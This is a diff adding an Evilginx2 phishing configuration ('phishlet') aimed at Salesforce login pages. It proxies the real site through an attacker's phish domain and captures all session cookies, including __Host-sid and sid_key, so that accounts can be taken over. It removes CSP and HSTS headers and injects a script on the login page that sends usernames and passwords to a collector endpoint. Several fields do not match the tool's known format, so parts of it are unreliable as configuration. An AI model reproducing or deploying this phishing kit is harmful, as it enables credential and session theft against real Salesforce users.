@@ -1,0 +1,130 @@
+# -------------------------------------------------
+# Evilginx2 – Phishlet (spec version 3.0.0)
+# -------------------------------------------------
+meta:
+  version: "3.0.0"
+  description: |
+    Minimal phishlet.
+    Captures the three main session cookies (__Host‑sid, sid_key, BrowserId),
+    removes CSP/HSTS, follows redirects and injects a tiny
+    credential‑stealer.
+
+# -----------------------------------------------------------------
+# 1️⃣  Target & Phish endpoints
+# -----------------------------------------------------------------
+target:
+  domain: orig_domain
+  scheme: https                     # Salesforce always uses HTTPS
+
+phish:
+  domain: phish_domain   # <<< CHANGE TO YOUR OWN DOMAIN
+  scheme: https                     # TLS served from ./cert/
+
+# -----------------------------------------------------------------
+# 2️⃣  Rewrite engine – catch‑all + Salesforce‑specific tweaks
+# -----------------------------------------------------------------
+rewrite:
+  # Global catch‑all – rewrite every absolute URL to the phish domain
+  - from: "^https?://([^/]+)(/.*)?$"
+    to:   "https://{{ .Phish.Domain }}{{ .Path }}"
+
+  # Preserve the exact path for the classic login JSP
+  - from: "^https://{{ .Target.Domain }}/secur/(.*)$"
+    to:   "https://{{ .Phish.Domain }}/secur/{{ .Capture }}"
+
+  # Keep query strings on the OAuth authorize endpoint
+  - from: "^https://{{ .Target.Domain }}/services/oauth2/authorize\\?(.*)$"
+    to:   "https://{{ .Phish.Domain }}/services/oauth2/authorize?{{ .Query }}"
+
+  # Force any stray HTTP redirect back to HTTPS on the phish side
+  - condition:
+      header:
+        name: "Location"
+        contains: "http://"
+    from: "^http://{{ .Target.Domain }}(.*)$"
+    to:   "https://{{ .Phish.Domain }}{{ .Path }}"
+
+# -----------------------------------------------------------------
+# 3️⃣  Cookie handling – Salesforce session cookies
+# -----------------------------------------------------------------
+cookies:
+  - name: "__Host-sid"
+    capture: true
+    forward: true
+    secure: true
+    httpOnly: true
+
+  - name: "BrowserId"
+    capture: true
+    forward: true
+
+  - name: "sid_key"
+    capture: true
+    forward: true
+
+  # Fallback – capture anything else that might appear
+  - name: ".*"
+    capture: true
+    forward: true
+
+# -----------------------------------------------------------------
+# 4️⃣  Session persistence
+# -----------------------------------------------------------------
+session:
+  store: true
+  ttl: 86400          # 24 h (adjust as needed)
+
+# -----------------------------------------------------------------
+# 5️⃣  JavaScript injection (optional)
+# -----------------------------------------------------------------
+inject:
+  - url: "/secur/login.jsp"
+    inline: |
+      // Very small credential exfiltration script
+      document.addEventListener('DOMContentLoaded', () => {
+        const form = document.querySelector('form');
+        if (!form) return;
+        form.addEventListener('submit', () => {
+          const email = document.querySelector('#username')?.value || '';
+          const pwd   = document.querySelector('#password')?.value || '';
+          fetch('https://{{ .Phish.Domain }}/collector', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({email,password:pwd})
+          });
+        });
+      });
+
+# -----------------------------------------------------------------
+# 6️⃣  Header manipulation – strip CSP & HSTS that would break the phish
+# -----------------------------------------------------------------
+headers:
+  - direction: response
+    name: "Strict-Transport-Security"
+    remove: true
+  - direction: response
+    name: "Content-Security-Policy"
+    remove: true
+  - direction: request
+    name: "X-Evilginx-Phish"
+    value: "inspocomputing_sf"
+
+# -----------------------------------------------------------------
+# 7️⃣  Advanced options (helpful)
+# -----------------------------------------------------------------
+advanced:
+  http2_upstream: true          # Supports HTTP/2
+  follow_redirects: true        # keep the victim on the phish domain
+  rate_limit:
+    requests_per_minute: 150
+
+# -----------------------------------------------------------------
+# 8️⃣  Logging
+# -----------------------------------------------------------------
+logging:
+  level: info
+  capture_body: false
+
+# -------------------------------------------------
+# End of phishlet
+# -------------------------------------------------
